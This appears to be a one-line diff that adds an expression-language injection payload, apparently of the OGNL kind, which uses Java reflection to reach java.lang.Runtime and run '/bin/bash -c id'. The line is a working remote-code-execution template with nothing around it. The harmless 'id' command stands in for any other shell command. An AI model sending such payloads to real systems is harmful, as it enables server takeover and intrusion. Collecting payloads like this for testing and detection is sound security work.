@@ -1,0 +1,1 @@
+#String.class.getClass().forName("java.lang.Runtime").getMethod("exec",String.class).invoke(String.class.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(String.class.getClass().forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"});
